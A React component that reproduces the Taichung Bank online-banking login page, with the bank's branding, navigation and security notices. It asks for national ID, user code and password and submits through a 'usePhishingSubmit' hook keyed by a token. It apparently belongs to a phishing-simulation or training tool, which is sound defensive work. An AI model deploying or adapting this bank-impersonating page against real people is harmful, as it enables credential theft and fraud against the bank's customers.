"use client";

import { usePhishingSubmit } from "./usePhishingSubmit";

export default function TaichungBankLogin({ token }: { token: string }) {
  const { loading, handleSubmit } = usePhishingSubmit(token);

  return (
    <div className="min-h-screen bg-[#f5f5f5]">
      {/* Top bar */}
      <div className="bg-[#c8102e] text-white">
        <div className="max-w-[1200px] mx-auto px-4 py-2 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded bg-white flex items-center justify-center">
                <span className="text-[#c8102e] text-[10px] font-bold leading-tight text-center">台中<br/>銀行</span>
              </div>
              <div>
                <div className="font-bold text-base">台中銀行</div>
                <div className="text-[10px] opacity-80">Taichung Bank</div>
              </div>
            </div>
            <span className="text-sm ml-4 opacity-90">個人網路銀行</span>
          </div>
          <div className="text-xs">
            <a href="#" className="text-white hover:underline">回首頁</a>
          </div>
        </div>
      </div>

      {/* Sub nav */}
      <div className="bg-white border-b border-[#ddd] shadow-sm">
        <div className="max-w-[1200px] mx-auto px-4">
          <div className="flex gap-6 py-2.5 text-sm text-[#333]">
            {["帳戶總覽", "轉帳服務", "繳費服務", "信用卡", "貸款服務", "投資理財"].map((item) => (
              <a key={item} href="#" className="hover:text-[#c8102e]">{item}</a>
            ))}
          </div>
        </div>
      </div>

      {/* Main content */}
      <div className="max-w-[1200px] mx-auto px-4 py-8 flex flex-col lg:flex-row gap-8">
        {/* Login form */}
        <div className="lg:w-[420px]">
          <div className="bg-white rounded-lg shadow border border-[#e0e0e0] overflow-hidden">
            <div className="bg-[#c8102e] px-6 py-3">
              <h2 className="text-white font-bold text-base">會員登入</h2>
            </div>

            <div className="p-6">
              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm text-[#333] mb-1 font-medium">身分證字號</label>
                  <input
                    type="text"
                    placeholder="請輸入身分證字號"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#c8102e]"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <label className="block text-sm text-[#333] mb-1 font-medium">使用者代號</label>
                  <input
                    type="text"
                    placeholder="請輸入使用者代號"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#c8102e]"
                    autoComplete="off"
                  />
                </div>
                <div>
                  <label className="block text-sm text-[#333] mb-1 font-medium">網銀密碼</label>
                  <input
                    type="password"
                    placeholder="請輸入網銀密碼"
                    className="w-full px-3 py-2.5 border border-[#ccc] rounded text-sm outline-none focus:border-[#c8102e]"
                    autoComplete="off"
                  />
                </div>

                <div className="flex items-center gap-3 text-xs text-[#666]">
                  <input type="checkbox" id="tcb-captcha" />
                  <label htmlFor="tcb-captcha">我不是機器人</label>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-[#c8102e] text-white py-2.5 rounded text-sm font-medium hover:bg-[#a80d25] transition-colors disabled:opacity-50"
                >
                  {loading ? "登入中..." : "登入"}
                </button>

                <div className="flex justify-between text-xs text-[#666]">
                  <a href="#" className="hover:text-[#c8102e]">忘記密碼</a>
                  <a href="#" className="hover:text-[#c8102e]">線上申請</a>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Right side - info */}
        <div className="flex-1 hidden lg:block">
          <div className="bg-white rounded-lg shadow border border-[#e0e0e0] p-8">
            <h3 className="text-[#c8102e] font-bold text-lg mb-4">安全宣告與注意事項</h3>
            <ul className="space-y-3 text-sm text-[#555] leading-relaxed">
              <li>• 網路安全憑證及密碼係攸關您權益之重要資訊，請勿交予他人使用。</li>
              <li>• 請勿透過電子郵件中之超連結連接至本行網站。</li>
              <li>• 本行不會以電子郵件或簡訊要求您提供帳號密碼。</li>
              <li>• 如有任何疑問，請洽本行客服專線。</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="border-t border-[#ddd] mt-8 py-4 text-center text-xs text-[#999]">
        <p>&copy; 台中商業銀行 版權所有</p>
      </div>
    </div>
  );
}
